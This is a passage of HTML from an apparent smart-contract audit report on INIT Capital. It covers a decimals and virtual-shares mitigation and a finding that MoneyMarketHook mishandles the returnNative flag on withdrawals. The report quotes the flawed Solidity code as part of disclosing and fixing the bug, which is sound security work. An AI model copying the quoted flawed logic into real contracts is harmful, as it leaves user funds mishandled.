11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Vscode, Foundry</p>\n<h3 id=\"recommended-mitigation-steps-4\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-4\" aria-label=\"recommended mitigation steps 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Include the virtual shares decimals in the <code>decimals()</code> function:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"8\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">VIRTUAL_SHARES</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">8</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">decimals</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint8</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">IERC20Metadata</span><span class=\"mtk1\">(</span><span class=\"mtk12\">underlyingToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">decimals</span><span class=\"mtk1\">() + </span><span class=\"mtk12\">VIRTUAL_SHARES</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_toShares</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amt</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_totalAssets</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_totalShares</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amt</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mulDiv</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_totalShares</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">10</span><span class=\"mtk1\">**</span><span class=\"mtk12\">VIRTUAL_SHARES</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_totalAssets</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">VIRTUAL_ASSETS</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_toAmt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_shares</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_totalAssets</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_totalShares</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amt</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_shares</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mulDiv</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_totalAssets</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">VIRTUAL_ASSETS</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_totalShares</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">10</span><span class=\"mtk1\">**</span><span class=\"mtk12\">VIRTUAL_SHARES</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/36#issuecomment-1870338593\">fez-init (INIT) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-03-when-the-returnnative-parameter-is-set-to-true-in-the-_params-provided-to-moneymarkethookexecute-it-is-not-handled-properly-and-could-disrupt-user-expectations\" style=\"position:relative;\"><a href=\"#m-03-when-the-returnnative-parameter-is-set-to-true-in-the-_params-provided-to-moneymarkethookexecute-it-is-not-handled-properly-and-could-disrupt-user-expectations\" aria-label=\"m 03 when the returnnative parameter is set to true in the _params provided to moneymarkethookexecute it is not handled properly and could disrupt user expectations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/29\">[M-03] When the <code>returnNative</code> parameter is set to true in the <code>_params</code> provided to <code>MoneyMarketHook.execute</code>, it is not handled properly and could disrupt user expectations</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/29\">said</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/hook/MoneyMarketHook.sol#L168-L196\">https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/hook/MoneyMarketHook.sol#L168-L196</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/hook/MoneyMarketHook.sol#L76-L80\">https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/hook/MoneyMarketHook.sol#L76-L80</a></p>\n<p>When <code>param.returnNative</code> is set to true while calling <code>MoneyMarketHook.execute</code>, users expect the returned token from the withdraw operation to be in native form and sent to the caller. However, in the current implementation, this is not considered and could disrupt user expectations.</p>\n<h3 id=\"proof-of-concept-5\" style=\"position:relative;\"><a href=\"#proof-of-concept-5\" aria-label=\"proof of concept 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The withdraw functionality inside <code>MoneyMarketHook</code> will process the <code>WithdrawParams</code> provided by users and construct the operations using <code>_handleWithdraw</code>, which consist of calling <code>decollateralize</code> and <code>burnTo</code> in <code>InitCore</code>, providing the parameters accordingly.</p>\n<p><a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/hook/MoneyMarketHook.sol#L168-L196\">https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/hook/MoneyMarketHook.sol#L168-L196</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"9\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_handleWithdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_offset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_data</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_initPosId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">WithdrawParams</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_params</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">internal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">view</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">_params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">i</span><span class=\"mtk1\">.</span><span class=\"mtk11\">uinc</span><span class=\"mtk1\">()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// decollateralize to pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_data</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_offset</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodeWithSelector</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">IInitCore</span><span class=\"mtk1\">.</span><span class=\"mtk12\">decollateralize</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_initPosId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_params</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_params</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">shares</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_params</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_offset</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_offset</span><span class=\"mtk1\">.</span><span class=\"mtk11\">uinc</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// burn collateral to underlying token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">helper</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_params</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">rebaseHelperParams</span><span class=\"mtk1\">.</span><span class=\"mtk12\">helper</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uTokenReceiver</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_params</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">to</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// if need to unwrap to rebase token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">helper</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uToken</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ILendingPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_params</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">).</span><span class=\"mtk11\">underlyingToken</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">_require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">_params</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">rebaseHelperParams</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenIn</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">uToken</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                        &amp;&amp; </span><span class=\"mtk11\">IRebaseHelper</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_params</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">rebaseHelperParams</span><span class=\"mtk1\">.</span><span class=\"mtk12\">helper</span><span class=\"mtk1\">).</span><span class=\"mtk11\">YIELD_BEARING_TOKEN</span><span class=\"mtk1\">() == </span><span class=\"mtk12\">uToken</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span class=\"mtk12\">INVALID_TOKEN_IN</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">uTokenReceiver</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">helper</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_data</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_offset</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodeWithSelector</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IInitCore</span><span class=\"mtk1\">.</span><span class=\"mtk12\">burnTo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_params</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uTokenReceiver</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_offset</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_offset</span><span class=\"mtk1\">.</span><span class=\"mtk11\">uinc</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_offset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_data</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>As it can be observed, <code>_handleWithdraw</code> doesn’t check <code>param.returnNative</code> and not adjust the <code>uTokenReceiver</code> token receiver to <code>address(this)</code> when <code>param.returnNative</code> is set to true.</p>\n<p>Now, when <code>execute</code> finish perform the multicall and check that <code>_params.returnNative</code> is set to true, it will not work properly as the token is not send to the Hook.</p>\n<p><a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/hook/MoneyMarketHook.sol#L76-L80\">https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/hook/MoneyMarketHook.sol#L76-L80</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"10\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">execute</span><span class=\"mtk1\">(</span><span class=\"mtk12\">OperationParams</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_params</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">payable</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">posId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">initPosId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">results</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// create position if not exist</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">posId</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            (</span><span class=\"mtk12\">posId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">initPosId</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">createPos</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">mode</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">viewer</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// for existing position, only owner can execute</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">posId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">posId</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">initPosId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">initPosIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">][</span><span class=\"mtk12\">posId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">_require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">IERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">POS_MANAGER</span><span class=\"mtk1\">).</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">initPosId</span><span class=\"mtk1\">) == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span class=\"mtk12\">NOT_OWNER</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">results</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_handleMulticall</span><span class=\"mtk1\">(</span><span class=\"mtk12\">initPosId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_params</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check slippage</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">minHealth_e18</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk11\">IInitCore</span><span class=\"mtk1\">(</span><span class=\"mtk12\">CORE</span><span class=\"mtk1\">).</span><span class=\"mtk11\">getPosHealthCurrent_e18</span><span class=\"mtk1\">(</span><span class=\"mtk12\">initPosId</span><span class=\"mtk1\">), </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span class=\"mtk12\">SLIPPAGE_CONTROL</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// unwrap token if needed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">_params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawParams</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">i</span><span class=\"mtk1\">.</span><span class=\"mtk11\">uinc</span><span class=\"mtk1\">()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">helper</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawParams</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">rebaseHelperParams</span><span class=\"mtk1\">.</span><span class=\"mtk12\">helper</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">helper</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) </span><span class=\"mtk11\">IRebaseHelper</span><span class=\"mtk1\">(</span><span class=\"mtk12\">helper</span><span class=\"mtk1\">).</span><span class=\"mtk11\">unwrap</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawParams</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">to</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// return native token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">returnNative</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;&gt;         </span><span class=\"mtk11\">IWNative</span><span class=\"mtk1\">(</span><span class=\"mtk12\">WNATIVE</span><span class=\"mtk1\">).</span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">WNATIVE</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;&gt;         (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success</span><span class=\"mtk1\">,) = </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span 